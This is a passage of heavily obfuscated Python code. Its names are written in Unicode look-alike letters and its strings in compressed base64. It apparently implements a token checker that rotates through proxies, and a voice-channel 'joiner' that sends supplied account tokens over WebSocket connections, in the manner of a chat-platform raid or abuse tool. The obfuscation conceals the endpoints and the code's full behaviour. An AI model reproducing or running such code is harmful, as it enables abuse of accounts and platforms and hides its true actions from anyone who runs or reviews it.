0j))]).b64decode(__𝘪𝗺𝘱𝙤𝗿𝘵__(𝗹𝘔𝘐𝙄𝘔𝗹𝙈𝙉𝘐𝗜𝗡𝘔𝘭𝘭𝘐𝘔𝗹𝗠𝘭𝙄𝗠𝙄𝗠𝘐𝙉𝘔𝙄𝘭𝗹𝗹𝗡𝘭[𝗿𝗼𝙪𝙣𝙙(𝘢𝗯𝘴(0.4977580912439036 + 0.8673159070380445j))]).decompress(b'x\xdam\x92\xdb\x8e\xdb \x10\x86_\xc9v\xd6+\xe5bo\xa2\xf8P\xb6\xe0\x18\xc3`s\x07\xc1\xda\xd4\x80E\xba\x878~\xfa\x92\xcd\xaaj\xd5^\x8e\xe6\xf4\xcd\xff\x8f\xec\xdd\xb3\xf1$\xef\x98D\xba\xa2\x97\xc1\xa7\x9d\xf1\xed\xca\x84\xc3m\x12\xc2\x90%9\xce\xf0\x15f\x87\x94\xdf\x06n\xcd\xeb\xe8\xec\xb5\xe9\x9dj\x13T\x0c1\xd6\x15z\xe7\xf7\xfa\\8\xf3\xa0K70\xbf\x0c\xd8\xe6\x1f\x02\x8e\xa9\x81\xd0\x9b\xcc\x1d\x14\x0f\x8f\xb20\x95\x12\xa8\x86{\xfd\xf9w\xbf\x97V\x83\xcc\x87\x15\xbd\x1a\x8f\xc2\x8dGYH\x19\xc7\t\xe1iA\x19A\xaa7a\x98H#=}\x8b<\x13\xf6K6x\x87\x88ug\xda\x1b\xacl\x992\xa0?M\x92\x17_\xf3\xb3a-rU\x917\xe6\xb7\x9f\xfc\x92S\x89\x0b\x17"\x8f\x14\x05\xda\x88=\xaaF\xb0Wy\xe7\xbb\x08\xa0d\xe4\x9f\xf9\tg\xcb\x8dW\x98\xf2\xe5:\xd6Rb+W\xe1\xc8m\xdf{;\xdfy\x84\xc8\x9f?\xf5\xf2\xcb\xa4\xf7v\x89\xfcb\x84\x97+\xf5\xb9\x82\x95_:\x11>\x14\xd0\xbea\xf2\x04\x9b\xd3*\x00?`\xbe\x9c[a\xbeS\xff\xa7\xde\x86\xeb\xb2\x9c#\xff\xce\xc4{\x8f\x99\x11x\x7f\xd31\xd0c\xe1J:\x9b\x89nN\xaf0!\xa1\x00_\xf5~\x87G\x07\x8fl\xb6\xc9h\xf3\xd0\x8a-\xc3\xd5\t\xa0\x84\xcd1q\xf5X\xefN\xd8\xc1\xcco\xf5\xbe\xb86\xf5\x0e\xd1\x14]"_\x13\xfd~\xe3\xbd$|\xa5\x1bV\x85\xa8W\xca\x87\xccP\xecO\xf90}[t\xb1<F=\x0f\xed=\x0fq>W\x1b \xca\xf2\xa5\xe3 \x8ei\xe8\xd9\xb4\x9b4s)\xab\x03\x1a\xe3=\xac\x07\x02\x85\x9b\x81\xa1J\x83\x1b\xba\xf9o\xbe\xae\'H\xf3\x10\xe7\x13;\xba0t\xff\xf5\xdb\xe5q\x1f\x89\xf7\xf3\xee\xdf\xff\x90\xda\xc9K\x8c;\xe9\xd1;\xccT\xde\xfao\xfa\x8e<=\x0b\x06\r-\xcb\xb5\x13I\xaa*Z\xeb=R0\xb9 K\xf3\x1ay\xab\xa6\x07\x0bk\x19\x84;!\xc5\xb7g\xc6\xd0\x01\xaa\xe3\xca\n\xf2\xac<\xaau\xb5\xfc\xd0\x0e\xf9\x98W_\xfb&<E?\xb3\xb4\xd1\x85;\x1f\xeb\xd8\x1f\xfd\x93\xae\xd8\x1e\xda\xa7\xa7_:\x1a\x1e\x84')).decode()}

def check_token(token):
    𝘩𝘦𝗮𝘥𝗲𝗿𝘴 = 𝙃𝗲𝗮𝘥𝙚𝗿𝘀(𝘵𝘰𝘬𝗲𝗻)
    try:
        if 𝘱𝘳𝘰𝘅𝘺:
            𝘳𝘦𝘴𝘱𝘰𝙣𝘴𝗲 = 𝗿𝗲𝙦𝙪𝘦𝘴𝘵𝘴.get(__𝗶𝗺𝙥𝘰𝘳𝘁__(𝙡𝙈𝙄𝗜𝙈𝗹𝗠𝘕𝗜𝗜𝙉𝗠𝘭𝗹𝗜𝗠𝗹𝘔𝙡𝘐𝘔𝗜𝘔𝙄𝗡𝘔𝘐𝙡𝘭𝙡𝘕𝗹[𝗿𝗼𝙪𝙣𝗱(𝗮𝘣𝘴(0.0 + 0j))]).b64decode(__𝗶𝙢𝗽𝗼𝘳𝘵__(𝗹𝗠𝗜𝙄𝙈𝘭𝗠𝘕𝗜𝘐𝘕𝘔𝘭𝗹𝙄𝗠𝘭𝘔𝗹𝗜𝙈𝘐𝘔𝗜𝗡𝘔𝘐𝗹𝙡𝘭𝙉𝘭[𝗿𝘰𝙪𝗻𝗱(𝙖𝘣𝙨(0.22613199697360686 + 0.9740966686857772j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\x02\xe2\x08\xbf\x9c\xe4<\xdf\xb2@w\xc3\x1c\x1fc\xbf\x9c\x14\x8f\xa0\x82\xa4\xdc\x94*\x00r.\x15\x1e')).decode(), headers=𝘩𝘦𝘢𝗱𝗲𝙧𝙨, proxy={__𝗶𝗺𝘱𝙤𝗿𝙩__(𝘭𝘔𝘐𝗜𝗠𝘭𝙈𝘕𝙄𝙄𝗡𝙈𝗹𝗹𝘐𝘔𝘭𝘔𝗹𝘐𝗠𝙄𝗠𝗜𝙉𝘔𝗜𝘭𝗹𝗹𝘕𝘭[𝙧𝙤𝘶𝗻𝗱(𝙖𝙗𝘴(0.0 + 0j))]).b64decode(__𝙞𝗺𝘱𝘰𝗿𝙩__(𝙡𝘔𝙄𝗜𝗠𝙡𝘔𝗡𝙄𝗜𝘕𝘔𝗹𝙡𝗜𝗠𝘭𝙈𝘭𝙄𝗠𝙄𝘔𝗜𝙉𝗠𝗜𝙡𝗹𝘭𝙉𝘭[𝘳𝙤𝙪𝗻𝙙(𝗮𝗯𝘀(0.031707787895448036 + 0.9994971816802574j))]).decompress(b'x\xdaK\xf4\x082Hv\xb4\xb5\x05\x00\n\xea\x02J')).decode(): __𝙞𝗺𝗽𝗼𝙧𝘵__(𝗹𝘔𝗜𝘐𝘔𝘭𝘔𝗡𝘐𝙄𝙉𝙈𝗹𝙡𝘐𝗠𝘭𝙈𝘭𝗜𝙈𝘐𝘔𝘐𝘕𝗠𝙄𝘭𝙡𝗹𝙉𝙡[𝘳𝙤𝘶𝘯𝗱(𝘢𝗯𝘀(0.0 + 0j))]).b64decode(__𝙞𝙢𝘱𝗼𝙧𝙩__(𝗹𝗠𝗜𝗜𝙈𝘭𝙈𝘕𝘐𝗜𝙉𝗠𝗹𝗹𝗜𝗠𝘭𝗠𝙡𝙄𝘔𝘐𝘔𝙄𝗡𝙈𝗜𝘭𝘭𝘭𝙉𝙡[𝘳𝙤𝘂𝘯𝘥(𝗮𝗯𝘴(0.6164726873873196 + 0.7873762923186449j))]).decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf3)\xb7\xb5\x05\x00\x19\xbc\x03\xf5')).decode() + 𝘳𝙖𝙣𝗱𝘰𝙢.choice(𝙥𝙧𝘰𝘹𝗶𝘦𝘀), __𝘪𝘮𝘱𝘰𝗿𝙩__(𝗹𝘔𝘐𝙄𝙈𝗹𝙈𝘕𝙄𝗜𝗡𝘔𝙡𝗹𝘐𝗠𝙡𝙈𝘭𝙄𝙈𝙄𝘔𝗜𝙉𝗠𝙄𝘭𝘭𝙡𝗡𝗹[𝙧𝙤𝙪𝗻𝘥(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝗼𝙧𝘵__(𝗹𝙈𝗜𝘐𝘔𝗹𝘔𝙉𝗜𝙄𝘕𝘔𝘭𝙡𝗜𝗠𝘭𝗠𝗹𝙄𝘔𝘐𝗠𝙄𝘕𝙈𝙄𝗹𝙡𝙡𝘕𝘭[𝙧𝘰𝘶𝗻𝙙(𝗮𝗯𝘀(0.10681583367641734 + 0.994278822904326j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf0\xb5\x05\x00\x0b\x1f\x02a')).decode(): __𝘪𝙢𝗽𝗼𝙧𝙩__(𝙡𝙈𝙄𝙄𝗠𝗹𝘔𝗡𝘐𝗜𝘕𝗠𝘭𝗹𝙄𝘔𝗹𝙈𝗹𝘐𝘔𝘐𝙈𝘐𝗡𝗠𝙄𝙡𝙡𝗹𝙉𝗹[𝘳𝗼𝘂𝙣𝘥(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝘰𝘳𝘁__(𝗹𝘔𝘐𝙄𝗠𝗹𝗠𝘕𝗜𝗜𝘕𝙈𝗹𝗹𝙄𝙈𝘭𝗠𝗹𝘐𝙈𝘐𝙈𝗜𝗡𝗠𝙄𝗹𝙡𝙡𝘕𝘭[𝗿𝘰𝘶𝙣𝗱(𝘢𝗯𝘴(0.7564244161535089 + 0.654081113201431j))]).decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf3)\xb7\xb5\x05\x00\x19\xbc\x03\xf5')).decode() + 𝗿𝘢𝗻𝘥𝘰𝘮.choice(𝗽𝗿𝙤𝘹𝘪𝙚𝘀)})
        else:
            𝙧𝘦𝙨𝗽𝘰𝗻𝙨𝘦 = 𝘳𝘦𝙦𝙪𝙚𝘴𝙩𝘀.get(__𝙞𝘮𝘱𝙤𝗿𝘁__(𝘭𝘔𝙄𝘐𝙈𝙡𝘔𝘕𝘐𝗜𝘕𝗠𝘭𝘭𝗜𝘔𝘭𝙈𝙡𝗜𝙈𝘐𝙈𝗜𝗡𝙈𝙄𝗹𝘭𝗹𝗡𝙡[𝘳𝘰𝙪𝗻𝙙(𝙖𝙗𝘴(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝗼𝗿𝘵__(𝘭𝘔𝙄𝙄𝗠𝙡𝘔𝗡𝘐𝗜𝙉𝙈𝘭𝙡𝗜𝗠𝗹𝙈𝙡𝘐𝗠𝘐𝘔𝗜𝘕𝙈𝘐𝙡𝙡𝙡𝘕𝙡[𝗿𝗼𝘂𝗻𝙙(𝗮𝗯𝘀(0.7802525382319475 + 0.6254646085771786j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\x02\xe2\x08\xbf\x9c\xe4<\xdf\xb2@w\xc3\x1c\x1fc\xbf\x9c\x14\x8f\xa0\x82\xa4\xdc\x94*\x00r.\x15\x1e')).decode(), headers=𝙝𝙚𝗮𝘥𝙚𝙧𝘀)
        𝙙𝙣 = 𝘵𝙤𝙠𝙚𝙣.split(__𝙞𝘮𝗽𝙤𝘳𝘁__(𝗹𝘔𝗜𝙄𝙈𝗹𝙈𝙉𝗜𝙄𝘕𝘔𝙡𝘭𝗜𝘔𝘭𝙈𝙡𝗜𝙈𝗜𝘔𝙄𝗡𝘔𝙄𝙡𝘭𝘭𝘕𝙡[𝘳𝙤𝙪𝘯𝙙(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝙤𝘳𝘁__(𝘭𝗠𝘐𝗜𝘔𝗹𝗠𝙉𝗜𝘐𝙉𝙈𝗹𝘭𝙄𝗠𝘭𝘔𝙡𝘐𝗠𝗜𝗠𝙄𝘕𝘔𝘐𝘭𝗹𝘭𝘕𝗹[𝗿𝙤𝘂𝘯𝘥(𝘢𝗯𝘀(0.4069519765303419 + 0.9134495545995127j))]).decompress(b'x\xda\xf3I\xb7\xb5\x05\x00\x03 \x01.')).decode())
        𝙣𝙣 = 𝗱𝙣[𝘳𝘰𝙪𝗻𝗱(𝙖𝘣𝘀(0.0 + 0j))]
        if 𝘳𝙚𝘀𝘱𝗼𝘯𝘀𝙚.status_code == 𝘳𝗼𝘶𝙣𝘥(𝗮𝘣𝙨(19.09711339969109 + 199.08616290390285j)):
            𝙥𝙧𝙞𝙣𝘁(__𝗶𝙢𝙥𝗼𝗿𝙩__(𝙡𝘔𝘐𝗜𝘔𝘭𝗠𝙉𝘐𝘐𝙉𝘔𝗹𝙡𝙄𝗠𝘭𝗠𝙡𝙄𝗠𝗜𝙈𝗜𝗡𝙈𝘐𝗹𝘭𝙡𝙉𝘭[𝗿𝙤𝘶𝗻𝗱(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝗽𝙤𝙧𝘁__(𝙡𝘔𝙄𝘐𝘔𝙡𝗠𝘕𝘐𝗜𝘕𝙈𝗹𝘭𝙄𝙈𝙡𝗠𝘭𝗜𝗠𝗜𝙈𝗜𝘕𝗠𝘐𝗹𝘭𝙡𝗡𝘭[𝙧𝘰𝘶𝙣𝗱(𝘢𝗯𝘀(0.22088991610887287 + 0.9752987465189398j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0c\xcbu+N\x0c\x0f2O\x0b3H\x07\x8a\x9b\xa7\x05\xe7\x17\x02\x00\xcf\x10\x0bw')).decode().format(𝗿, 𝙙𝗮𝘁𝙚𝘵𝗶𝗺𝘦.datetime.now().strftime(f"{𝗴}{__𝘪𝗺𝙥𝘰𝘳𝘁__(𝙡𝙈𝘐𝘐𝙈𝘭𝗠𝙉𝙄𝗜𝘕𝙈𝗹𝙡𝗜𝗠𝙡𝗠𝗹𝗜𝘔𝙄𝗠𝙄𝘕𝙈𝘐𝘭𝗹𝙡𝙉𝙡[𝘳𝘰𝙪𝗻𝙙(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝙧}"), 𝘳, 𝗹𝙘, 𝗿, 𝗻𝙣, 𝗴))
            return True
        elif 𝘳𝙚𝙨𝘱𝗼𝘯𝙨𝙚.status_code == 𝙧𝗼𝘂𝗻𝘥(𝗮𝗯𝘀(100.74317106465882 + 390.2048352901805j)):
            𝘱𝘳𝘪𝘯𝘁(__𝗶𝙢𝗽𝘰𝙧𝘁__(𝘭𝙈𝘐𝘐𝙈𝗹𝗠𝗡𝙄𝘐𝙉𝙈𝗹𝙡𝗜𝙈𝗹𝗠𝗹𝗜𝙈𝘐𝗠𝘐𝗡𝘔𝙄𝗹𝘭𝘭𝘕𝘭[𝗿𝙤𝘂𝗻𝗱(𝙖𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝗼𝘳𝘁__(𝘭𝘔𝙄𝘐𝙈𝗹𝗠𝙉𝗜𝙄𝗡𝙈𝘭𝗹𝙄𝗠𝙡𝘔𝙡𝗜𝗠𝙄𝙈𝘐𝗡𝙈𝗜𝘭𝗹𝗹𝘕𝗹[𝘳𝗼𝘶𝘯𝙙(𝘢𝗯𝘴(0.18713274855592354 + 0.9823346346423429j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0cq\xb7\xccJ4\n\xcb\x86\x89\xa5\x1a\x1b\x14z\xa7\xdb\xda\x02\x00\xf9;\x0c0')).decode().format(𝘳, 𝙙𝘢𝙩𝙚𝙩𝘪𝘮𝗲.datetime.now().strftime(f"{𝙜}{__𝙞𝙢𝘱𝙤𝘳𝘁__(𝗹𝗠𝘐𝙄𝗠𝙡𝙈𝙉𝗜𝙄𝙉𝗠𝘭𝙡𝙄𝗠𝙡𝙈𝙡𝘐𝗠𝘐𝙈𝗜𝘕𝘔𝙄𝗹𝙡𝘭𝘕𝗹[𝙧𝗼𝙪𝘯𝗱(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝗿}"), 𝗿, 𝘍𝙤𝙧𝙚.CYAN, 𝙧, 𝗻𝙣, 𝘨))
            return False
        else:
            𝗽𝙧𝗶𝙣𝘁(__𝗶𝗺𝗽𝙤𝙧𝘁__(𝗹𝘔𝘐𝗜𝙈𝗹𝗠𝘕𝘐𝘐𝙉𝙈𝗹𝗹𝘐𝘔𝘭𝘔𝙡𝗜𝘔𝙄𝘔𝙄𝙉𝘔𝗜𝘭𝙡𝘭𝗡𝙡[𝘳𝙤𝘂𝘯𝗱(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝗼𝘳𝘵__(𝙡𝘔𝗜𝙄𝗠𝗹𝙈𝘕𝙄𝘐𝘕𝘔𝗹𝗹𝙄𝗠𝗹𝗠𝙡𝘐𝗠𝘐𝘔𝗜𝗡𝘔𝗜𝗹𝗹𝘭𝘕𝗹[𝗿𝙤𝙪𝙣𝙙(𝗮𝙗𝘀(0.7609739114299908 + 0.6487824798211959j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0c\x0e75\x8a\x0c\xaf(\x88\x02\xf2#\x82\x9d\xcc\xd3"J,\xbd3\xf3m\x01\xfd\x9d\x0c\xb5')).decode().format(𝘳, 𝘥𝗮𝘵𝗲𝙩𝗶𝙢𝙚.datetime.now().strftime(f"{𝙜}{__𝗶𝘮𝘱𝗼𝘳𝙩__(𝘭𝙈𝘐𝘐𝙈𝗹𝙈𝗡𝙄𝙄𝗡𝙈𝗹𝙡𝗜𝙈𝘭𝘔𝘭𝙄𝙈𝙄𝘔𝙄𝘕𝙈𝗜𝗹𝘭𝘭𝗡𝘭[𝙧𝗼𝘂𝗻𝙙(𝘢𝙗𝘴(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝘳}"), 𝙧, 𝘣, 𝗿, 𝙣𝗻, 𝗴))
            return False
    except:
        pass

def vc_joiner(token, guild, channel):
    𝘥𝘯 = 𝘁𝙤𝘬𝗲𝘯.split(__𝗶𝗺𝘱𝗼𝗿𝘵__(𝗹𝘔𝗜𝘐𝘔𝙡𝗠𝗡𝙄𝗜𝘕𝙈𝗹𝗹𝗜𝙈𝙡𝘔𝙡𝗜𝙈𝙄𝘔𝘐𝗡𝗠𝗜𝙡𝘭𝙡𝗡𝘭[𝘳𝙤𝘶𝘯𝗱(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝘰𝙧𝘵__(𝘭𝗠𝙄𝗜𝙈𝘭𝙈𝙉𝘐𝗜𝘕𝗠𝙡𝗹𝙄𝙈𝘭𝘔𝙡𝙄𝙈𝗜𝙈𝗜𝘕𝗠𝘐𝗹𝗹𝘭𝘕𝗹[𝘳𝙤𝘂𝙣𝘥(𝙖𝘣𝙨(0.5836653364719404 + 0.811994319562087j))]).decompress(b'x\xda\xf3I\xb7\xb5\x05\x00\x03 \x01.')).decode())
    𝘯𝙣 = 𝘥𝙣[𝘳𝘰𝘶𝘯𝗱(𝗮𝙗𝘴(0.0 + 0j))]
    for _ in 𝙧𝘢𝘯𝘨𝙚(𝘳𝗼𝘂𝗻𝗱(𝗮𝙗𝘴(0.5088022779413977 + 0.860883407879165j))):
        𝙬𝘀 = 𝗪𝘦𝗯𝙎𝙤𝙘𝙠𝘦𝘵()
        𝙬𝙨.connect(__𝙞𝙢𝘱𝙤𝙧𝘵__(𝙡𝗠𝙄𝙄𝙈𝙡𝘔𝙉𝗜𝙄𝙉𝘔𝗹𝙡𝙄𝙈𝘭𝙈𝙡𝙄𝙈𝘐𝗠𝗜𝙉𝙈𝘐𝘭𝘭𝙡𝗡𝙡[𝘳𝙤𝘶𝗻𝙙(𝘢𝗯𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝙥𝘰𝘳𝘵__(𝙡𝗠𝙄𝘐𝗠𝙡𝙈𝘕𝙄𝗜𝙉𝙈𝗹𝗹𝙄𝘔𝘭𝗠𝙡𝗜𝘔𝗜𝙈𝘐𝙉𝗠𝗜𝗹𝙡𝙡𝗡𝙡[𝙧𝙤𝘶𝘯𝗱(𝗮𝘣𝘴(0.6631096309561353 + 0.74852228913588j))]).decompress(b'x\xdaK1\xf6\xab\xf2\xcf\xb4(\x8b2r3\x88\x8aH\xc9H\r6\xcdN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9M\xc9\xf3\xa9\xb24\n\x08\xc9\xce\x8d\n7\xcdJ2\n*H\xcaM\xb6L\xcc\xf3+KJ\xb7\xb5\x05\x00i\xfb\x14x')).decode())
        𝘄𝙨.send(𝙟𝙨𝗼𝗻.dumps({__𝙞𝗺𝗽𝙤𝘳𝘵__(𝙡𝘔𝙄𝗜𝘔𝘭𝗠𝗡𝘐𝘐𝘕𝘔𝙡𝙡𝙄𝙈𝙡𝙈𝗹𝘐𝙈𝗜𝗠𝘐𝙉𝗠𝙄𝘭𝙡𝘭𝗡𝙡[𝘳𝘰𝙪𝙣𝘥(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝙤𝗿𝘁__(𝗹𝙈𝗜𝙄𝘔𝙡𝗠𝘕𝙄𝘐𝗡𝗠𝗹𝙡𝘐𝘔𝘭𝘔𝙡𝙄𝘔𝘐𝘔𝘐𝙉𝙈𝘐𝙡𝘭𝗹𝙉𝗹[𝙧𝗼𝙪𝘯𝘥(𝙖𝙗𝘴(0.477274765947737 + 0.8787541167980568j))]).decompress(b'x\xdaK2v\xb4\x05\x00\x02\xe4\x01\x14')).decode(): 𝘳𝗼𝘶𝗻𝗱(𝗮𝗯𝙨(0.24338970292822482 + 1.9851351219774713j)), __𝘪𝘮𝙥𝙤𝗿𝙩__(𝗹𝘔𝘐𝗜𝘔𝙡𝙈𝘕𝘐𝘐𝙉𝗠𝙡𝘭𝗜𝗠𝗹𝗠𝗹𝙄𝘔𝘐𝘔𝘐𝘕𝘔𝘐𝘭𝘭𝗹𝘕𝘭[𝗿𝗼𝘶𝙣𝘥(𝘢𝙗𝘴(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝘰𝙧𝘵__(𝘭𝘔𝘐𝘐𝙈𝙡𝙈𝘕𝘐𝗜𝘕𝗠𝗹𝗹𝘐𝘔𝘭𝙈𝘭𝘐𝘔𝗜𝙈𝙄𝙉𝘔𝗜𝙡𝗹𝗹𝘕𝗹[𝙧𝙤𝘂𝘯𝙙(𝘢𝗯𝘀(0.4917509389340605 + 0.8707359037374477j))]).decompress(b'x\xda\x8br\xb4\xb5\x05\x00\x02\xe6\x01\x16')).decode(): {__𝙞𝙢𝗽𝙤𝙧𝙩__(𝙡𝙈𝗜𝗜𝗠𝘭𝘔𝗡𝘐𝙄𝗡𝙈𝗹𝙡𝘐𝙈𝙡𝗠𝙡𝗜𝘔𝘐𝘔𝙄𝘕𝙈𝗜𝘭𝘭𝘭𝗡𝘭[𝙧𝗼𝙪𝘯𝗱(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝙢𝘱𝗼𝙧𝙩__(𝗹𝘔𝙄𝙄𝘔𝘭𝘔𝘕𝗜𝗜𝙉𝙈𝗹𝙡𝙄𝘔𝘭𝘔𝘭𝗜𝙈𝘐𝘔𝘐𝘕𝗠𝘐𝙡𝗹𝙡𝙉𝙡[𝙧𝗼𝘂𝙣𝗱(𝙖𝗯𝘴(0.6266681125776925 + 0.7792862610609227j))]).decompress(b'x\xdaKq\xb7,\x8a\n7\xb1\x05\x00\x0b\xbb\x02y')).decode(): 𝘵𝙤𝙠𝗲𝗻, __𝗶𝘮𝙥𝙤𝘳𝙩__(𝘭𝗠𝗜𝗜𝘔𝘭𝘔𝘕𝗜𝙄𝙉𝘔𝗹𝗹𝙄𝙈𝘭𝘔𝘭𝙄𝗠𝙄𝙈𝗜𝘕𝘔𝙄𝙡𝘭𝗹𝙉𝙡[𝘳𝗼𝙪𝙣𝙙(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝘰𝙧𝙩__(𝘭𝘔𝗜𝗜𝘔𝙡𝙈𝘕𝘐𝘐𝗡𝙈𝙡𝙡𝗜𝙈𝘭𝙈𝘭𝘐𝘔𝘐𝙈𝘐𝗡𝙈𝗜𝙡𝘭𝘭𝙉𝙡[𝘳𝗼𝘂𝙣𝗱(𝙖𝘣𝘴(0.9776079608614525 + 0.21043449066232625j))]).decompress(b'x\xdaK\xf6\xf0*Kv\x0f\xabLq\xcf\xc9I.\xb7\xb5\x05\x001-\x05\xbc')).decode(): {__𝘪𝙢𝙥𝗼𝘳𝙩__(𝘭𝘔𝗜𝙄𝘔𝘭𝘔𝗡𝙄𝗜𝙉𝘔𝙡𝘭𝙄𝗠𝘭𝗠𝙡𝗜𝗠𝙄𝙈𝗜𝙉𝗠𝗜𝙡𝗹𝙡𝘕𝗹[𝘳𝗼𝘂𝗻𝙙(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝘱𝗼𝗿𝘵__(𝘭𝗠𝗜𝘐𝘔𝙡𝗠𝙉𝘐𝗜𝙉𝙈𝗹𝙡𝗜𝙈𝘭𝗠𝘭𝙄𝙈𝗜𝗠𝘐𝗡𝘔𝙄𝘭𝗹𝙡𝙉𝗹[𝘳𝗼𝙪𝗻𝙙(𝙖𝗯𝙨(0.2305052401340345 + 0.9730710838735016j))]).decompress(b'x\xda\xf3r\xb7\xac\x02\x00\x02\xed\x01E')).decode(): __𝘪𝙢𝙥𝗼𝙧𝘁__(𝗹𝘔𝙄𝘐𝗠𝗹𝘔𝗡𝘐𝗜𝙉𝘔𝘭𝗹𝗜𝘔𝘭𝗠𝙡𝗜𝗠𝗜𝙈𝗜𝙉𝘔𝙄𝙡𝙡𝗹𝘕𝙡[𝙧𝘰𝘂𝙣𝙙(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝗼𝗿𝘵__(𝘭𝘔𝗜𝙄𝗠𝘭𝙈𝙉𝗜𝘐𝗡𝙈𝗹𝗹𝘐𝘔𝘭𝘔𝙡𝙄𝙈𝙄𝘔𝗜𝗡𝙈𝙄𝙡𝘭𝗹𝙉𝙡[𝘳𝘰𝘂𝙣𝘥(𝘢𝗯𝘀(0.25857623379471373 + 0.9659908546754165j))]).decompress(b'x\xdaK1\xca)\x8dr\xb74N.\xb7\xb5\x05\x00\x19\xf5\x03\xd9')).decode(), __𝘪𝗺𝗽𝘰𝘳𝘵__(𝘭𝗠𝗜𝗜𝗠𝗹𝙈𝙉𝘐𝙄𝗡𝙈𝗹𝙡𝙄𝘔𝘭𝗠𝗹𝗜𝙈𝙄𝙈𝙄𝘕𝘔𝙄𝘭𝗹𝗹𝗡𝙡[𝗿𝙤𝘶𝙣𝗱(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝙤𝙧𝘵__(𝘭𝙈𝙄𝗜𝗠𝗹𝙈𝘕𝗜𝗜𝗡𝗠𝙡𝘭𝘐𝘔𝗹𝙈𝙡𝗜𝙈𝙄𝙈𝙄𝗡𝗠𝙄𝗹𝙡𝘭𝘕𝗹[𝗿𝗼𝘶𝗻𝘥(𝘢𝘣𝙨(0.9965334250608235 + 0.08319334550638076j))]).decompress(b'x\xda\xf3r\xf7\xaaL2N\xa9\x8a\x8a\xf0\xb4\x05\x00\x1a$\x04\x00')).decode(): __𝙞𝘮𝗽𝙤𝗿𝙩__(𝙡𝗠𝙄𝘐𝙈𝙡𝗠𝘕𝗜𝙄𝙉𝗠𝙡𝗹𝗜𝘔𝙡𝗠𝗹𝘐𝗠𝘐𝗠𝘐𝙉𝗠𝘐𝘭𝙡𝘭𝙉𝙡[𝘳𝘰𝙪𝘯𝘥(𝙖𝙗𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝙤𝗿𝘵__(𝗹𝙈𝙄𝙄𝗠𝗹𝗠𝙉𝘐𝗜𝙉𝗠𝘭𝙡𝘐𝘔𝘭𝙈𝗹𝘐𝘔𝗜𝙈𝗜𝘕𝙈𝗜𝘭𝘭𝘭𝘕𝙡[𝘳𝗼𝘂𝘯𝙙(𝘢𝘣𝘀(0.6021678596022152 + 0.7983695064705858j))]).decompress(b'x\xda\x0br\xcf\xa9\x8a4\xb2\xac\x8cr\xb4\xb5\x05\x00\x1a.\x03\xd2')).decode(), __𝙞𝗺𝘱𝘰𝘳𝙩__(𝗹𝗠𝘐𝘐𝙈𝘭𝗠𝘕𝙄𝗜𝘕𝗠𝙡𝗹𝙄𝗠𝗹𝙈𝙡𝙄𝙈𝙄𝙈𝙄𝙉𝗠𝗜𝗹𝗹𝙡𝘕𝙡[𝗿𝙤𝙪𝘯𝗱(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝘱𝘰𝗿𝙩__(𝗹𝘔𝗜𝗜𝗠𝙡𝘔𝙉𝘐𝘐𝗡𝙈𝙡𝘭𝘐𝗠𝘭𝗠𝙡𝙄𝙈𝘐𝙈𝗜𝘕𝘔𝗜𝗹𝗹𝙡𝗡𝗹[𝘳𝘰𝘶𝙣𝗱(𝗮𝙗𝘀(0.6662721117744985 + 0.7457087052405585j))]).decompress(b'x\xda\xf3r\x0f\xcaI\xc9\xcd\xc9\x8a\n\xb4\xb5\x05\x00\x1bX\x04\x1c')).decode(): __𝙞𝘮𝘱𝗼𝗿𝘁__(𝘭𝙈𝙄𝙄𝙈𝘭𝗠𝘕𝙄𝗜𝘕𝙈𝘭𝙡𝗜𝗠𝙡𝙈𝙡𝘐𝙈𝗜𝘔𝗜𝙉𝙈𝗜𝗹𝘭𝘭𝗡𝘭[𝗿𝗼𝘶𝘯𝗱(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝙤𝗿𝙩__(𝘭𝙈𝙄𝙄𝗠𝙡𝗠𝘕𝗜𝙄𝙉𝗠𝙡𝘭𝗜𝙈𝗹𝗠𝗹𝙄𝙈𝗜𝘔𝙄𝗡𝘔𝗜𝘭𝗹𝙡𝘕𝘭[𝙧𝘰𝙪𝗻𝙙(𝘢𝗯𝘀(0.5207188831802312 + 